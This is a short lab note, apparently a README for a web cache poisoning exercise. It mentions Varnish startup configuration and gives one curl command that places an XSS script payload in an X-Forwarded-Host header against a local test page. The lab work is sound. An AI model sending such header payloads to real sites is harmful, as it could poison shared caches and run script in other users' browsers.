# Cache Poison Lab

## How to configure Varnish Startup

You can't edit `/etc/default/varnish` any more, it is ignored. See this

<https://github.com/varnish/Varnish-Cache/pull/92#>


## UA

```
curl -s -i localhost:82/ua.php  -A "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:69.0) Gecko/20100101 Firefox/69.0" -H 'X-Forwarded-Host: "><script>alert(1)</script>'
```
